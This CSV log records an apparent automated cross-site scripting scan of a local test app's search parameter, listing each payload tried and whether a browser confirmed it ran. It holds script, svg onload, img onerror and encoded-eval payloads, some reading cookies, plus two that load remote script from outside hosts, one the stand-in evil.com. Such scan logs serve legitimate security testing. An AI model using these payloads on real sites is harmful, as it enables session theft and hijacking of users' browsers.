Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:23:26.346,2026-01-10 16:23:26.654,0.308,http://localhost:3000/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:26.654,2026-01-10 16:23:26.675,0.021,http://localhost:3000/search,GET,q,<script>alert('XSS')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:26.675,2026-01-10 16:23:26.940,0.266,http://localhost:3000/search,GET,q,"<script>alert(""XSS"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:26.940,2026-01-10 16:23:26.943,0.002,http://localhost:3000/search,GET,q,<script>prompt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:26.943,2026-01-10 16:23:26.959,0.016,http://localhost:3000/search,GET,q,<script>confirm(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:26.959,2026-01-10 16:23:26.961,0.002,http://localhost:3000/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:26.961,2026-01-10 16:23:26.976,0.015,http://localhost:3000/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:26.976,2026-01-10 16:23:26.979,0.003,http://localhost:3000/search,GET,q,<script>alert(window.origin)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:26.979,2026-01-10 16:23:27.628,0.650,http://localhost:3000/search,GET,q,<script src=//xss.rocks/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-10 16:23:27.628,2026-01-10 16:23:30.295,2.666,http://localhost:3000/search,GET,q,<script src=https://evil.com/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-10 16:23:30.295,2026-01-10 16:23:30.315,0.021,http://localhost:3000/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.315,2026-01-10 16:23:30.318,0.003,http://localhost:3000/search,GET,q,<svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.318,2026-01-10 16:23:30.332,0.014,http://localhost:3000/search,GET,q,<svg><script>alert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.332,2026-01-10 16:23:30.335,0.003,http://localhost:3000/search,GET,q,<svg><animate onbegin=alert(1) attributeName=x dur=1s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.335,2026-01-10 16:23:30.356,0.020,http://localhost:3000/search,GET,q,"<svg/onload=alert(String.fromCharCode(88,83,83))>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.356,2026-01-10 16:23:30.358,0.003,http://localhost:3000/search,GET,q,<svg onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.358,2026-01-10 16:23:30.377,0.018,http://localhost:3000/search,GET,q,<svg onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.377,2026-01-10 16:23:30.379,0.002,http://localhost:3000/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.379,2026-01-10 16:23:30.395,0.016,http://localhost:3000/search,GET,q,<svg onload=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.396,2026-01-10 16:23:30.399,0.004,http://localhost:3000/search,GET,q,<svg><script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.399,2026-01-10 16:23:30.420,0.021,http://localhost:3000/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.420,2026-01-10 16:23:30.424,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.424,2026-01-10 16:23:30.443,0.019,http://localhost:3000/search,GET,q,<img src=x onerror=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.443,2026-01-10 16:23:30.446,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=alert('XSS')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.446,2026-01-10 16:23:30.466,0.020,http://localhost:3000/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.466,2026-01-10 16:23:30.469,0.003,http://localhost:3000/search,GET,q,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.469,2026-01-10 16:23:30.489,0.020,http://localhost:3000/search,GET,q,<img src=x onerror=alert(document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:23:30.489,2026-01-10 16:23:30.492,0.003,http://localhost:3000/search,GET,q,<img/src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
